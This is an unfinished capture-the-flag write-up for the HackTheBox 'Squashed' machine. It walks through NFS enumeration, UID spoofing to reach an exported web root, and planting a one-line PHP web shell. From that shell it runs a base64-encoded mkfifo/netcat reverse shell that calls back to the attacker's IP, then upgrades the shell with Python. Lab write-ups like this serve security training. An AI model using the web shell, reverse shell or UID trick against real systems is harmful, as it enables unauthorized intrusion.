---
title: "HTB Squashed"
date: 2022-12-12T18:22:03-05:00
draft: false
---

First we will start with an nmap scan.

```bash
sudo nmap -sC -sV -p- -T4 -oN nmap/squashed.nmap $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-12 18:20 EST
Nmap scan report for 10.129.40.85
Host is up (0.041s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      42597/tcp   mountd
|   100005  1,2,3      49332/udp6  mountd
|   100005  1,2,3      57441/tcp6  mountd
|   100005  1,2,3      58098/udp   mountd
|   100021  1,3,4      34613/udp6  nlockmgr
|   100021  1,3,4      34643/tcp   nlockmgr
|   100021  1,3,4      43627/tcp6  nlockmgr
|   100021  1,3,4      58073/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34643/tcp open  nlockmgr 1-4 (RPC #100021)
42597/tcp open  mountd   1-3 (RPC #100005)
43229/tcp open  mountd   1-3 (RPC #100005)
47523/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.17 seconds
```

A lot of information is returned from our nmap scan, but port 2049 looks interesting. It is a NFS share, lets check it out!

```bash
showmount -e $IP

Export list for $IP:
/home/ross    *
/var/www/html *
```

Awesome we can see a users home folder & the web root directory!
Now lets try and mount them, and see what information we can gather.

```bash
sudo mount -t nfs 10.129.40.85:/home/ross /mnt/squashed -o nolock

cd /mnt/squashed && ls -la

drwxr-xr-x 14 1001 1001 4096 Dec 12 18:19 .
drwxr-xr-x  3 root root 4096 Dec 12 18:35 ..
lrwxrwxrwx  1 root root    9 Oct 20 09:24 .bash_history -> /dev/null
drwx------ 11 1001 1001 4096 Oct 21 10:57 .cache
drwx------ 12 1001 1001 4096 Oct 21 10:57 .config
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Desktop
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Documents
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Downloads
drwx------  3 1001 1001 4096 Oct 21 10:57 .gnupg
drwx------  3 1001 1001 4096 Oct 21 10:57 .local
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Music
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Pictures
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Public
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Templates
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Videos
lrwxrwxrwx  1 root root    9 Oct 21 09:07 .viminfo -> /dev/null
-rw-------  1 1001 1001   57 Dec 12 18:19 .Xauthority
-rw-------  1 1001 1001 2475 Dec 12 18:19 .xsession-errors
-rw-------  1 1001 1001 2475 Oct 31 06:13 .xsession-errors.old

```

Great, now if we run the `tree` command we can see all the files in the directories.

```bash
tree
.
├── Desktop
├── Documents
│   └── Passwords.kdbx
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos

8 directories, 1 file
```

interesting this *Passwords.kdbx* file looks interesting!

This is a KeePass file used to store passwords, but it is encrypted, and trying to use `keepass2john` fails... oh well lets move forward.

lets take a look at the www share. we can mount it using the same command as before, but replacing the directory

Once in the share it seems we arent able to access anything, but it show everything being owned by the user id *2017* and group *www-data*

```bash
drwxr-xr--  5 2017 www-data  4096 Dec 12 19:00 www
```

we can abuse this and gain access to the contents of the folder by creating a user and changing their user id

```bash
sudo useradd pwnd

sudo usermod -u 2017 pwnd

sudo su pwnd -c bash
```

Now lets see if we can access the /var/www/html file share.

```bash
pwnd@kali:/mnt$ cd www
pwnd@kali:/mnt/www$ ls -la
total 56
drwxr-xr-- 5 pwnd www-data  4096 Dec 12 19:10 .
drwxr-xr-x 4 root root      4096 Dec 12 18:53 ..
drwxr-xr-x 2 pwnd www-data  4096 Dec 12 19:10 css
-rw-r--r-- 1 pwnd www-data    44 Oct 21 06:30 .htaccess
drwxr-xr-x 2 pwnd www-data  4096 Dec 12 19:10 images
-rw-r----- 1 pwnd www-data 32532 Dec 12 19:10 index.html
drwxr-xr-x 2 pwnd www-data  4096 Dec 12 19:10 js
pwnd@kali:/mnt/www$
```

Awesome! now that we have access to the web root lets put a simple php shell on the site!

```bash
echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > pwnd.php
```

Navigating to the website we can see that the shell worked!

{{< image src="static/Pasted image 20221212181527.png" alt="Initial WebShell" position="center" style="border-radius: 8px;" >}}

Now that we have command execution, lets go for a reverse shell.

I will use the mkfifo shell from https://highon.coffee/blog/reverse-shell-cheat-sheet/
and base64 encode it.

After base64 encoding the reverse shell we should have a string that looks like this
`bWtmaWZvIC90bXAvbG9sO25jIDEwLjEwLjE0Ljg4IDEzMzcgMDwvdG1wL2xvbCB8IC9iaW4vc2ggLWkgMj4mMSB8IHRlZSAvdG1wL2xvbCAK`

Now lets see if we catch a shell.

Before we run our reverse shell we must stat a listener

```bash
nc -lvnp $port
listening on [any] $port ...
```

navigating back to the site, and using our payload put (you must replace the b64 encoded string with yours):

`/pwnd.php?cmd=echo bWtmaWZvIC90bXAvbG9sO25jIDEwLjEwLjE0Ljg4IDEzMzcgMDwvdG1wL2xvbCB8IC9iaW4vc2ggLWkgMj4mMSB8IHRlZSAvdG1wL2xvbCAK | base64 -d | bash`

Looking back at our listener you should see this:

{{< image src="static/Pasted image 20221212183603.png" alt="RevShell" position="center" style="border-radius: 8px;" >}}

Cool! now we have a shell on the box!

*you can upgrade your shell using* 

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

***I will have to finish this post later***
